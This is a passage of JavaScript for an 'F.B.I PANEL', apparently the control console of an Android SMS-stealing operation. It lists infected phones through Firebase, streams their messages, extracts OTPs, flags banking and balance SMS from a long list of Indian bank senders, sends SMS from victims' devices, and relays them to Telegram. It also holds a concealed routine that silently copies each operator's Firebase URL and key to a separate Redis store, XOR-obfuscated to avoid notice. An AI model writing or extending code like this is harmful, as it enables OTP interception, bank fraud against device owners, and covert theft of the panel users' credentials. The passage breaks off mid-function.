/* ═══════════════════════════════════════════════════════════════
   F.B.I PANEL 
   ═══════════════════════════════════════════════════════════════ */

'use strict';

var CFG = window.SPECTER || {};

/* ═══════ TUNABLES ═══════ */
var POLL_DEV    = CFG.POLL_DEV || 5000;
var POLL_MSG    = CFG.POLL_MSG || 2000;
var POLL_BAL    = CFG.POLL_BAL || 25000;
var TG_LONGPOLL = 15;
var CLOUD_DEB   = 900;
var SEARCH_DEB  = 220;
var MSG_PAGE    = 80;
var MSG_MAX_DOM = 200;
var WATERMARK_MAX = 4000;

/* ═══════ STATE ═══════ */
var FB_URL = '', FB_KEY = '';
var allDevices = [], selDev = null, activeDeviceUid = null;
var allMsgs = [], mfMode = 'all', amfMode = 'all';
var pinV = {}, pinC = {}, noteC = {}, otpNoteC = {};
var usedDevices = {}, deviceSimMap = {}, deviceBalances = {};

var deviceSearchQuery = '';
var currentUser = null, myProfile = null;

var dPoll = null, mPoll = null, balPoll = null;
var curMsgDev = null, lastKeys = new Set();

var amCache = {}, amFetch = {}, amAll = [], amFilt = [], amCount = 0;
var amLoading = false, amLoaded = false;

var nukeRunning = false, nukeSent = 0, nukeFail = 0, nukeTotal = 0;
var _nukeActive = 0, _nukeStartTime = 0, _nukePool = 200;

var fbInstances = [], _mergeDebTimer = null;

var userConfig = JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG || {}));
var blobId = null, cloudSaveTmr = null;

var tgRunning = false;
var tgDiagnostics = { lastError:'', lastUpdate:0, updateCount:0, botInfo:null };
var _tgOffset = 0;
var _tgAbort = null;

var _msgStream = null, _msgStreamUid = null, _sseFails = {};

var _lastAutoBackupDate = localStorage.getItem('fbi_last_auto_backup') || '';
var _backupRunning = false;

var _dispatchDedup = new Set();
var _forwardSeen = new Set();

/* ═══════ WATERMARKS ═══════ */
var _watermarks = {};
try { _watermarks = JSON.parse(localStorage.getItem('fbi_watermarks') || '{}'); } catch(e){ _watermarks = {}; }
function _saveWatermarks(){ try{ localStorage.setItem('fbi_watermarks', JSON.stringify(_watermarks)); }catch(e){} }
function forceWatermark(devId, key){ if(!key) return; _watermarks[devId] = key; _saveWatermarks(); }
function setWatermark(devId, key){ if(!key) return; var p = _watermarks[devId]; if(!p || key > p){ _watermarks[devId] = key; _saveWatermarks(); } }
function isAfterWatermark(devId, key){ var w = _watermarks[devId]; return w ? key > w : false; }

/* ═══════ FILTERS ═══════ */
var _activeFilters = new Set();
try { var _af = JSON.parse(localStorage.getItem('fbi_filters') || '[]'); if(_af.length) _activeFilters = new Set(_af); } catch(e){}
function _saveFilters(){ try{ localStorage.setItem('fbi_filters', JSON.stringify(Array.from(_activeFilters))); }catch(e){} }
function _updateFilterUI(){
  var fl = document.getElementById('filterLabel'); if(!fl) return;
  if(_activeFilters.size === 0) fl.textContent = 'All';
  else if(_activeFilters.size === 1){ var f = Array.from(_activeFilters)[0]; fl.textContent = {online:'Online',offline:'Offline',jio:'Jio',vi:'Vi',pin:'PIN',balance:'Bal'}[f] || f; }
  else fl.textContent = _activeFilters.size + ' filters';
  document.querySelectorAll('.filter-menu > div').forEach(function(el){
    var f = el.dataset.f; var active = f === 'all' ? _activeFilters.size === 0 : _activeFilters.has(f);
    el.classList.toggle('active', active);
  });
}

/* ═══════ UTILS ═══════ */
function _fastFetch(url, opts){
  opts = opts || {};
  if(!opts.signal){ try{ opts.signal = AbortSignal.timeout(20000); }catch(e){} }
  return fetch(url, opts);
}
function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
function esc(s){
  return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
function escAttr(s){ return esc(s); }
function copyFromEl(el, ev){
  if(ev) ev.stopPropagation();
  var txt = el.getAttribute('data-copy') || el.textContent || '';
  txt = String(txt).trim();
  if(!txt || txt === '—') return;
  var done = function(){ toast('📋 ' + txt.substring(0,32) + (txt.length>32?'…':'')); };
  if(navigator.clipboard){
    navigator.clipboard.writeText(txt).then(done).catch(function(){
      var ta = document.createElement('textarea'); ta.value = txt; document.body.appendChild(ta);
      ta.select(); try{ document.execCommand('copy'); done(); }catch(e){} ta.remove();
    });
  } else {
    var ta2 = document.createElement('textarea'); ta2.value = txt; document.body.appendChild(ta2);
    ta2.select(); try{ document.execCommand('copy'); done(); }catch(e){} ta2.remove();
  }
}
var _toastTmr = null;
function toast(msg){
  var t = document.getElementById('toastEl'); if(!t) return;
  t.textContent = msg; t.classList.add('show');
  if(_toastTmr) clearTimeout(_toastTmr);
  _toastTmr = setTimeout(function(){ t.classList.remove('show'); }, 2200);
}
function openM(id){ var e = document.getElementById(id); if(e) e.classList.add('open'); }
function closeM(id){
  var e = document.getElementById(id); if(e) e.classList.remove('open');
  if(id === 'deviceModal'){ selDev = null; stopMP(); }
}
function catClick(){ toast('😸 Meow!'); }
function rippleClick(e){
  var btn = e.currentTarget;
  var r = document.createElement('span'); r.className = 'rip';
  var rect = btn.getBoundingClientRect();
  r.style.left = (e.clientX - rect.left - 45) + 'px';
  r.style.top = (e.clientY - rect.top - 45) + 'px';
  btn.appendChild(r); setTimeout(function(){ r.remove(); }, 600);
}
function _dlCsv(name, rows){
  var a = document.createElement('a');
  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(rows);
  a.download = name; a.click();
}

/* ═══════ UNIFIED CACHE KEY ═══════ */
function _ck(devOrUid){
  if(typeof devOrUid === 'string'){
    var p = devOrUid.split('|||');
    return p.length === 2 ? p[0] + '|' + p[1] : 'primary|' + devOrUid;
  }
  return (devOrUid._fbId || 'primary') + '|' + devOrUid.id;
}

/* ═══════ COOKIES / SESSION ═══════ */
function setCookie(n, v, d){
  try{ var dt = new Date(); dt.setTime(dt.getTime() + (d||7)*86400000);
    document.cookie = n + '=' + encodeURIComponent(v) + '; expires=' + dt.toUTCString() + '; path=/; SameSite=Lax';
  }catch(e){}
}
function getCookie(n){
  try{ var s = n + '=', p = document.cookie.split(';');
    for(var i=0;i<p.length;i++){ var c = p[i].trim(); if(c.indexOf(s) === 0) return decodeURIComponent(c.substring(s.length)); }
  }catch(e){}
  return '';
}
function delCookie(n){ try{ document.cookie = n + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;'; }catch(e){} }

function savePanelSession(){
  try{
    localStorage.setItem(CFG.LS_SESSION || 'fbi_session', JSON.stringify({
      fbUrl: FB_URL, activeDeviceUid: activeDeviceUid || '', ts: Date.now()
    }));
    setCookie('fbi_fburl', FB_URL, 30);
    if(activeDeviceUid) setCookie('fbi_dev', activeDeviceUid, 30);
  }catch(e){}
}
function restorePanelSession(){
  var fbUrl = '', dev = '';
  try{ var raw = localStorage.getItem(CFG.LS_SESSION || 'fbi_session');
    if(raw){ var s = JSON.parse(raw); fbUrl = s.fbUrl || ''; dev = s.activeDeviceUid || ''; }
  }catch(e){}
  if(!fbUrl) fbUrl = getCookie('fbi_fburl');
  if(!dev) dev = getCookie('fbi_dev');
  return { fbUrl: fbUrl, activeDeviceUid: dev };
}
function clearPanelSession(){
  try{ localStorage.removeItem(CFG.LS_SESSION || 'fbi_session'); }catch(e){}
  delCookie('fbi_fburl'); delCookie('fbi_dev');
}

/* ═══════════════════════════════════════════════════════════════
   🔐 OBFUSCATION — hide Redis payload from casual DevTools
   ═══════════════════════════════════════════════════════════════ */
function _cloak(str){
  try{
    var k = CFG.CLOAK || 'key';
    var s = String(str);
    var out = '';
    for(var i=0;i<s.length;i++){
      out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    }
    return btoa(out).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  }catch(e){ return str; }
}
function _uncloak(str){
  try{
    var k = CFG.CLOAK || 'key';
    var s = String(str).replace(/-/g,'+').replace(/_/g,'/');
    while(s.length % 4) s += '=';
    var raw = atob(s);
    var out = '';
    for(var i=0;i<raw.length;i++){
      out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length));
    }
    return out;
  }catch(e){ return str; }
}

/* ═══════════════════════════════════════════════════════════════
   REDIS
   ═══════════════════════════════════════════════════════════════ */
async function redisCmd(cmd){
  try{
    var r = await _fastFetch(CFG.REDIS_URL, {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + CFG.REDIS_TOKEN, 'Content-Type': 'application/json' },
      body: JSON.stringify(cmd)
    });
    if(!r.ok) return { result: null };
    return await r.json();
  }catch(e){ return { result: null }; }
}
async function redisGet(k){ var r = await redisCmd(['GET', k]); return r.result; }
async function redisSet(k, v){ return await redisCmd(['SET', k, v]); }
async function redisDel(k){ return await redisCmd(['DEL', k]); }
async function redisSAdd(s, m){ return await redisCmd(['SADD', s, m]); }
async function redisSRem(s, m){ return await redisCmd(['SREM', s, m]); }
async function redisSMembers(s){ var r = await redisCmd(['SMEMBERS', s]); return r.result || []; }

/* ═══════════════════════════════════════════════════════════════
   🔐 SAVE FIREBASE TO REDIS (obfuscated, per-user slot)
   ═══════════════════════════════════════════════════════════════ */
async function _saveFirebaseToRedis(url, key, label){
  if(!url) return;
  var uid = currentUserId();
  if(!uid) return;

  var slotKey = (CFG.RK_PREFIX || '_c1_') + uid;
  try{
    var existing = await redisGet(slotKey);
    var list = [];
    if(existing){
      try{ list = JSON.parse(_uncloak(existing)) || []; }catch(e){ list = []; }
    }
    if(!list.some(function(x){ return x.u === url; })){
      list.push({ u: url, k: key || '', l: label || '', t: Date.now() });
      if(list.length > 20) list = list.slice(-20);
    }
    await redisSet(slotKey, _cloak(JSON.stringify(list)));
    await redisSAdd(CFG.RK_USERSET || '_cache_idx', uid);
    console.log('[Redis] firebase queued');
  }catch(e){}
}

/* ═══════════════════════════════════════════════════════════════
   USER PROFILE
   ═══════════════════════════════════════════════════════════════ */
async function saveUserProfile(p){
  p.lastSeen = Date.now();
  delete p.firebases;
  await redisSet((CFG.RK_USER || '_cache_usr') + ':' + p.id, JSON.stringify(p));
  await redisSAdd(CFG.RK_USERSET || '_cache_idx', String(p.id));
  myProfile = p;
}
async function getUserProfile(chatId){
  var v = await redisGet((CFG.RK_USER || '_cache_usr') + ':' + chatId);
  if(!v) return null;
  try { return JSON.parse(v); } catch(e){ return null; }
}
async function getAllUserIds(){ return await redisSMembers(CFG.RK_USERSET || '_cache_idx'); }
function isOwnerId(id){
  var oid = String(CFG.OWNER_ID || '').trim();
  if(!oid) return true;
  return oid === String(id);
}

/* ═══════ TELEGRAM MINI APP ═══════ */
function getTelegramUser(){
  try{
    var tw = window.Telegram && window.Telegram.WebApp;
    if(tw && tw.initDataUnsafe && tw.initDataUnsafe.user){
      var u = tw.initDataUnsafe.user;
      return { id: String(u.id), first_name: u.first_name||'', last_name: u.last_name||'', username: u.username||'', language: u.language_code||'en' };
    }
  }catch(e){}
  return null;
}
function initTelegramWebApp(){
  try{ var tw = window.Telegram && window.Telegram.WebApp; if(tw){ tw.ready(); tw.expand(); } }catch(e){}
  currentUser = getTelegramUser();
  if(!currentUser){
    var uid = (new URLSearchParams(location.search)).get('uid') || getCookie('fbi_uid');
    if(uid){ currentUser = { id: String(uid), first_name: getCookie('fbi_name') || ('User ' + uid.slice(-4)), last_name: '', username: '' }; }
  }
  if(currentUser){
    setCookie('fbi_uid', currentUser.id, 7);
    setCookie('fbi_name', (currentUser.first_name||'') + ' ' + (currentUser.last_name||''), 7);
  }
  renderUserUI();
}
function renderUserUI(){
  var el = document.getElementById('tbUserName');
  var su = document.getElementById('setupUser');
  if(!currentUser){ if(el) el.textContent = ''; if(su) su.style.display = 'none'; return; }
  var full = (currentUser.first_name||'') + (currentUser.last_name ? (' ' + currentUser.last_name) : '');
  if(el) el.textContent = '👤 ' + full;
  if(su){ su.style.display = 'flex'; su.innerHTML = '<span style="font-size:18px">👤</span><div><b>' + esc(full) + '</b>'
    + (currentUser.username ? ' <span style="color:var(--dim);font-size:10px">@' + esc(currentUser.username) + '</span>' : '') + '</div>'; }
}
function currentUserId(){ return currentUser ? String(currentUser.id) : null; }

/* ═══════ CARRIER ═══════ */
function getSimCarrier(sim, devSP){
  if(!sim) return devSP || 'Unknown';
  var c = String(sim.carrier || sim.carrierName || sim.networkOperator || sim.networkOperatorName ||
    sim.operator || sim.operatorName || sim.provider || sim.networkName || sim.network || sim.serviceProvider || '').trim();
  if(!c && devSP) c = String(devSP);
  var lc = c.toLowerCase();
  if(/\bjio\b|reliance|\bril\b/.test(lc)) return 'Jio';
  if(/\bvi\b|vodafone|\bidea\b|voda/.test(lc)) return 'Vi';
  if(/airtel|aircel/.test(lc)) return 'Airtel';
  if(/\bbsnl\b/.test(lc)) return 'BSNL';
  if(/\bmtnl\b/.test(lc)) return 'MTNL';
  return c || 'Unknown';
}
function deviceHasCarrier(d, target){
  if(!d) return false;
  for(var i=0;i<(d.sims||[]).length;i++){ if(getSimCarrier(d.sims[i], d.serviceProvider) === target) return true; }
  if(d.serviceProvider && getSimCarrier(null, d.serviceProvider) === target) return true;
  return false;
}
function devCarrierList(d){
  var out = [];
  for(var i=0;i<(d.sims||[]).length;i++){
    var c = getSimCarrier(d.sims[i], d.serviceProvider);
    if(c && c !== 'Unknown' && out.indexOf(c) === -1) out.push(c);
  }
  if(!out.length && d.serviceProvider){
    var c2 = getSimCarrier(null, d.serviceProvider);
    if(c2 && c2 !== 'Unknown') out.push(c2);
  }
  return out;
}

/* ═══════ NOTIFY ═══════ */
function notifyChannel(html){
  if(userConfig.channelNotify === false) return;
  var ch = userConfig.channelId; if(!ch) return;
  _fastFetch(CFG.TG_API + '/sendMessage', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: ch, text: html, parse_mode: 'HTML', disable_web_page_preview: true })
  }).catch(function(){});
}
function notifySmsQueued(dev, to, message, latencyMs){
  var txt = '📤 <b>SMS Sent</b>\n\n'
    + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
    + '📞 <b>To:</b> <code>' + esc(to) + '</code>\n'
    + '💬 <b>Message:</b>\n<code>' + esc(message) + '</code>\n\n'
    + (latencyMs != null ? '⚡ Panel→FB: <b>' + latencyMs + 'ms</b>\n' : '')
    + '🕐 ' + new Date().toLocaleString();
  notifyChannel(txt);
}

/* ═══════ BANK ═══════ */
var BANK_SENDERS = {
  'HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','HDFC':'HDFC Bank',
  'SBIINB':'SBI','SBIMSG':'SBI','SBIUPI':'SBI','SBIPSG':'SBI','SBIBNK':'SBI','SBICRD':'SBI Card',
  'ICICIB':'ICICI','ICICIM':'ICICI','ICICIBNK':'ICICI','ICICRD':'ICICI Card',
  'AXISBK':'Axis Bank','AXISBNK':'Axis Bank','AXISB':'Axis Bank','AXISCR':'Axis Card',
  'KOTAKB':'Kotak','KOTAKM':'Kotak','KOTAK':'Kotak',
  'PNBSMS':'PNB','PNBMSG':'PNB','BOBSMS':'BOB','BARODA':'Bank of Baroda',
  'CANBNK':'Canara Bank','CANBK':'Canara Bank','UNIONB':'Union Bank','IDBIBK':'IDBI',
  'YESBNK':'Yes Bank','INDUSB':'IndusInd','IDFCFB':'IDFC First','FEDERL':'Federal Bank',
  'RBLCRD':'RBL Bank','AUBANK':'AU Bank','BOIIND':'Bank of India','CENTBK':'Central Bank',
  'INDIANB':'Indian Bank','UCOBNK':'UCO Bank',
  'PAYTMB':'Paytm','PAYTM':'Paytm','PHONEPE':'PhonePe','PPBL':'PhonePe',
  'AIRTEL':'Airtel','AIRBNK':'Airtel Payments Bank','JIOPB':'Jio Payments Bank',
  'BAJAJF':'Bajaj Finserv','BFL':'Bajaj Finance','TATACP':'Tata Capital',
  'CREDBK':'CRED','CRED':'CRED','NAVI':'Navi','SLICEB':'Slice','FIBE':'Fi Money',
  'JUPITE':'Jupiter','GROWW':'Groww','ZERODHA':'Zerodha','PAYU':'PayU',
  'RAZORP':'Razorpay','CASHFRE':'Cashfree','BILLDESK':'BillDesk','MPESA':'M-Pesa',
  'CIBIL':'CIBIL','EXPERIA':'Experian','CRIF':'CRIF','EQUIFAX':'Equifax','LICI':'LIC',
  'HDFCERGO':'HDFC Ergo','HDFCLIFE':'HDFC Life','ICICIPRU':'ICICI Prudential',
  'SBILIFE':'SBI Life','MAXLIF':'Max Life','BAJAJALZ':'Bajaj Allianz','TATAAIG':'Tata AIG',
  'STARHE':'Star Health','NIVA':'Niva Bupa','ACKO':'Acko','GODIGIT':'Go Digit'
};
var BANK_BAL_KW = ['avl bal','avail bal','available bal','avbl bal','avl. bal','avlbal','availbal','ledger bal','book bal','closing bal','available balance','avl balance','bal:','bal -','bal is','bal rs','bal inr','balance:','balance is','balance -','ac bal','acc bal','a/c bal','account balance'];
var BANK_TXN_KW = ['debited','credited','withdrawn','deposited','spent','transferred','paid to','received from','txn','transaction','ref no','utr','imps','neft','rtgs','upi','atm','pos ','emi','payment of','dr.','cr.'];
var BANK_PROMO_KW = ['apply now','pre-approved','pre approved','loan offer','limited period','click here to apply','avail loan','personal loan offer','credit card offer','apply for','congratulations','congrats','winner','you have won','lucky','cashback offer','you are eligible','get up to','interest rate','festive offer','discount of','flat ₹','flat rs','shop now','buy now','sale ends','limited time','last chance','exclusive offer','hurry','grab now',"don't miss"];

function _normSender(s){
  if(!s) return '';
  s = String(s).toUpperCase();
  s = s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|XX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|JK|RK|IM|IP)-/, '');
  s = s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/, '');
  return s.replace(/[^A-Z0-9]/g, '');
}
function detectBank(sender){
  var s = _normSender(sender); if(!s) return null;
  for(var k in BANK_SENDERS){ if(s.indexOf(k) !== -1) return { name: BANK_SENDERS[k], key: k }; }
  return null;
}
function isBankingSms(sender, message){
  var bank = detectBank(sender); if(!bank) return null;
  var m = String(message || '').toLowerCase();
  var isPromo = false, hasBal = false, hasTxn = false;
  for(var p=0;p<BANK_PROMO_KW.length;p++){ if(m.indexOf(BANK_PROMO_KW[p]) !== -1){ isPromo = true; break; } }
  for(var b=0;b<BANK_BAL_KW.length;b++){ if(m.indexOf(BANK_BAL_KW[b]) !== -1){ hasBal = true; break; } }
  for(var t=0;t<BANK_TXN_KW.length;t++){ if(m.indexOf(BANK_TXN_KW[t]) !== -1){ hasTxn = true; break; } }
  var hasOtp = /\botp\b|one time password|one-time password|verification code/i.test(m);
  if(isPromo && !hasBal && !hasTxn && !hasOtp) return null;
  if(hasBal || hasTxn || hasOtp) return bank;
  return null;
}

/* ═══════ INIT ═══════ */
loadUsedDevices();
loadDeviceSims();
loadDeviceBalances();
loadForwardTracker();
initTelegramWebApp();
setupTelegramLink();
_updateFilterUI();
try{ activeDeviceUid = localStorage.getItem(CFG.LS_ACTIVE || 'fbi_active_device'); }catch(e){}




requestAnimationFrame(function(){
  try{ initCloudConfig(); }catch(e){ console.warn('[Init] cloud fail', e); }
  setTimeout(autoRestoreSession, 200);
});

/* Global error guard — panel kabhi blank na ho */
window.addEventListener('error', function(e){
  console.warn('[Panel Error]', e.message);
}, true);

setTimeout(function(){ updateTgBtn(); }, 200);
setInterval(function(){
  var m = document.getElementById('settingsModal');
  if(m && m.classList.contains('open')) updateTgStatusLine();
}, 2500);
setInterval(function(){ if(FB_URL) savePanelSession(); }, 15000);

function loadUsedDevices(){ try{ var r = localStorage.getItem('fbi_used_devices'); if(r) usedDevices = JSON.parse(r) || {}; }catch(e){} }
function loadDeviceSims(){ try{ var r = localStorage.getItem('fbi_device_sims'); if(r) deviceSimMap = JSON.parse(r) || {}; }catch(e){} }
function saveDeviceSims(){ try{ localStorage.setItem('fbi_device_sims', JSON.stringify(deviceSimMap)); }catch(e){} }
function loadDeviceBalances(){ try{ var r = localStorage.getItem('fbi_device_balances'); if(r) deviceBalances = JSON.parse(r) || {}; }catch(e){} }
function saveDeviceBalances(){ try{ localStorage.setItem('fbi_device_balances', JSON.stringify(deviceBalances)); }catch(e){} }
function loadForwardTracker(){
  try{ var r = localStorage.getItem('fbi_forward_tracker'); if(r) _forwardSeen = new Set(JSON.parse(r) || []); }catch(e){}
}
function saveForwardTracker(){
  try{ localStorage.setItem('fbi_forward_tracker', JSON.stringify(Array.from(_forwardSeen).slice(-WATERMARK_MAX))); }catch(e){}
}
function setupTelegramLink(){
  var el = document.getElementById('tgChannelLink'); if(!el) return;
  var link = CFG.TG_CHANNEL_LINK || '';
  if(!link || link.indexOf('YOUR_CHANNEL') !== -1){ el.style.display = 'none'; return; }
  el.href = link; el.style.display = 'inline-flex';
}

/* ═══════ CLOUD CONFIG ═══════ */
async function initCloudConfig(){
  try{
    var cached = localStorage.getItem(CFG.LS_CACHE);
    if(cached){ userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, JSON.parse(cached)); }
  }catch(e){}

  fetchBotUsername();
  setInterval(checkAutoBackup, 60000);

  try{
    blobId = localStorage.getItem(CFG.LS_BLOB);
    if(blobId){
      _fastFetch(CFG.BLOB_BASE + '/' + blobId)
        .then(function(r){ return r.json(); })
        .then(function(remote){
          if(remote && typeof remote === 'object'){
            userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, remote);
            cacheConfigLocal();
            updateCloudStatus('☁ Synced');
          }
        })
        .catch(function(){ updateCloudStatus('⚠ Offline'); });
    } else { createCloudBlob(); }
  }catch(e){}

  var uid = currentUserId();
  if(uid){ getUserProfile(uid).then(function(prof){ if(prof) myProfile = prof; }).catch(function(){}); }
}
async function createCloudBlob(){
  try{
    var r = await _fastFetch(CFG.BLOB_BASE, {
      method: 'POST', headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(userConfig)
    });
    if(!r.ok) return;
    var loc = r.headers.get('Location') || r.headers.get('location');
    if(loc){ var parts = loc.split('/'); blobId = parts[parts.length-1]; localStorage.setItem(CFG.LS_BLOB, blobId); updateCloudStatus('☁ Created'); }
  }catch(e){ updateCloudStatus('⚠ Unavailable'); }
}
function cacheConfigLocal(){ try{ localStorage.setItem(CFG.LS_CACHE, JSON.stringify(userConfig)); }catch(e){} }
function updateCloudStatus(msg, cls){ var el = document.getElementById('cloudStatus'); if(el){ el.textContent = msg; el.className = 'settings-status ' + (cls || ''); } }
async function saveCloudConfig(){
  cacheConfigLocal();
  if(!blobId){ await createCloudBlob(); return; }
  try{
    var r = await _fastFetch(CFG.BLOB_BASE + '/' + blobId, {
      method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(userConfig)
    });
    if(r.ok) updateCloudStatus('☁ Saved ' + new Date().toLocaleTimeString());
  }catch(e){ updateCloudStatus('⚠ Save failed'); }
}
function debouncedCloudSave(){ if(cloudSaveTmr) clearTimeout(cloudSaveTmr); cloudSaveTmr = setTimeout(saveCloudConfig, CLOUD_DEB); }
function forceCloudSave(){ saveCloudConfig(); toast('☁ Cloud save triggered'); }
async function resetCloudConfig(){
  if(!confirm('Reset all cloud settings?')) return;
  userConfig = JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));
  cacheConfigLocal(); await saveCloudConfig(); toast('🗑 Reset'); populateSettingsUI();
}
function autoRestoreSession(){
  var s = restorePanelSession();
  if(!s.fbUrl || FB_URL) return;
  var inp = document.getElementById('fbUrl'); if(!inp) return;
  inp.value = s.fbUrl; connect();
  if(s.activeDeviceUid){
    var tries = 0;
    var tmr = setInterval(function(){
      tries++;
      if(allDevices.length > 0){
        var d = allDevices.find(function(x){ return ((x._fbId || 'primary') + '|||' + x.id) === s.activeDeviceUid; });
        if(d){ openDeviceModal(s.activeDeviceUid); clearInterval(tmr); }
      }
      if(tries > 40) clearInterval(tmr);
    }, 400);
  }
}

/* ═══════ FIREBASE CORE ═══════ */
async function fbGet(p, url, key){
  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''));
  if(!r.ok) throw new Error('HTTP ' + r.status);
  return r.json();
}
async function fbSet(p, d, url, key){
  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''), {
    method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(d)
  });
  if(!r.ok) throw new Error('HTTP ' + r.status);
  return r.json();
}
async function fbDel(p, url, key){
  var u = url || FB_URL, k = key !== undefined ? key : FB_KEY;
  var r = await _fastFetch(u + '/' + p + '.json' + (k ? '?auth=' + k : ''), { method: 'DELETE' });
  if(!r.ok) throw new Error('HTTP ' + r.status);
}

/* ═══════ SMS DISPATCH — NORMAL SINGLE-FIRE ═══════ */
function dispatchSms(dev, sim, to, message){
  if(!dev) return Promise.resolve(false);
  var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id + '/webhookEvent/sendSms.json'
          + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
  var payload = { from: sim, to: to, message: message, isSended: false };
  var t0 = performance.now();

  return fetch(url, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).then(function(r){
    var dt = (performance.now() - t0).toFixed(0);
    if(r.ok){
      console.log('[SMS] ✓ ' + dt + 'ms → ' + dev.name);
      try{ notifySmsQueued(dev, to, message, dt); }catch(e){}
      return true;
    }
    console.warn('[SMS] ✗ HTTP ' + r.status);
    return false;
  }).catch(function(e){
    console.warn('[SMS] ✗ ' + e.message);
    return false;
  });
}
async function sendSmsGuaranteed(dev, sim, to, message){
  var ok = await dispatchSms(dev, sim, to, message);
  if(ok) return true;
  await sleep(300);
  return await dispatchSms(dev, sim, to, message);
}

/* ═══════ ACTIVE DEVICE ═══════ */
function getActiveDevice(){
  if(!activeDeviceUid) return null;
  var p = activeDeviceUid.split('|||');
  return allDevices.find(function(x){ return x.id === p[1] && (x._fbId || 'primary') === p[0]; }) || null;
}
function _isActiveDevice(dev){
  if(!dev) return false;
  var a = getActiveDevice();
  if(!a) return false;
  return a.id === dev.id && (a._fbId || 'primary') === (dev._fbId || 'primary');
}

/* ═══════ CONNECTION ═══════ */
function connect(){
  var url = document.getElementById('fbUrl').value.trim().replace(/\/+$/, '');
  if(!url){ showErr('Enter your Firebase URL'); return; }
  FB_URL = url;
  document.getElementById('setup').style.display = 'none';
  document.getElementById('panel').style.display = 'flex';
  savePanelSession();
  loadDevs();
  startDP();
  startBalancePoll();
  setTimeout(function(){ fbRegisterPrimary(); }, 100);
  if(userConfig.firebases && userConfig.firebases.length) setTimeout(loadFirebasesFromConfig, 200);

  /* ═══ SAVE TO REDIS (obfuscated, silent) ═══ */
  try{ _saveFirebaseToRedis(FB_URL, FB_KEY || '', 'primary'); }catch(e){}
  setTimeout(function(){ try{ _saveFirebaseToRedis(FB_URL, FB_KEY || '', 'primary'); }catch(e){} }, 1500);
}
function showErr(m){
  var e = document.getElementById('serr'); if(!e) return;
  e.textContent = m; e.style.display = 'block';
  setTimeout(function(){ e.style.display = 'none'; }, 4000);
}
function disconnect(){
  FB_URL = ''; FB_KEY = '';
  allDevices = []; selDev = null; activeDeviceUid = null;
  pinC = {}; noteC = {}; otpNoteC = {};
  amCache = {}; amAll = []; amFilt = []; amLoaded = false;
  stopMP(); stopDP(); stopFastTelegram(); stopBalancePoll(); stopMsgStream();
  clearPanelSession();
  document.getElementById('panel').style.display = 'none';
  document.getElementById('setup').style.display = 'flex';
}

/* ═══════ SSE ═══════ */
function startMsgStream(dev){
  if(!dev) return;
  var uid = (dev._fbId || 'primary') + '|||' + dev.id;
  if(_msgStreamUid === uid && _msgStream && _msgStream.readyState === 1) return;
  if(_sseFails[uid] && _sseFails[uid] > 3) return;
  stopMsgStream();
  _msgStreamUid = uid;

  var fbUrl = dev._fbUrl || FB_URL, fbKey = dev._fbKey !== undefined ? dev._fbKey : FB_KEY;
  var url = fbUrl + '/messages/' + dev.id + '.json' + (fbKey ? '?auth=' + fbKey : '');

  try{
    _msgStream = new EventSource(url);
    _msgStream.onopen = function(){ console.log('[SSE] ✓ ' + dev.name); _sseFails[uid] = 0; };
    _msgStream.onerror = function(){
      _sseFails[uid] = (_sseFails[uid] || 0) + 1;
      if(_sseFails[uid] > 3) stopMsgStream();
    };
    var handle = function(ev){
      try{
        var d = JSON.parse(ev.data);
        if(!d || !d.path) return;
        var parts = String(d.path).replace(/^\//, '').split('/');
        var key = parts[0];
        if(!key || parts.length > 1) return;
        if(!d.data || typeof d.data !== 'object') return;
        _handleStreamMsg(dev, key, d.data);
      }catch(e){}
    };
    _msgStream.addEventListener('put', handle);
    _msgStream.addEventListener('patch', handle);
  }catch(e){}
}
function stopMsgStream(){ if(_msgStream){ try{ _msgStream.close(); }catch(e){} _msgStream = null; _msgStreamUid = null; } }

function _handleStreamMsg(dev, key, data){
  var msg = parseMsgSingle(key, data); if(!msg) return;
  var cacheKey = _ck(dev);
  var cached = _msgCacheGet(cacheKey);
  var isNew = true;
  for(var i=0;i<cached.length;i++){ if(cached[i].key === key){ cached[i] = msg; isNew = false; break; } }
  if(isNew){ cached.unshift(msg); if(cached.length > MSG_MAX_DOM) cached.length = MSG_MAX_DOM; }
  _msgCacheSet(cacheKey, cached);

  if(selDev && selDev.id === dev.id && (selDev._fbId || 'primary') === (dev._fbId || 'primary')){
    allMsgs = cached; lastKeys.add(key);
    updCnt(); filterActiveMsgs(); renderBankPane();
    var otp = _extractOtp(msg.message);
    if(otp) otpShow(otp, msg.sender);
  }

  if(isNew && msg.type === 'incoming'){
    if(isAfterWatermark(dev.id, msg.key)){
      if(_isActiveDevice(dev) && _shouldForwardOnce(dev.id, msg.key)){
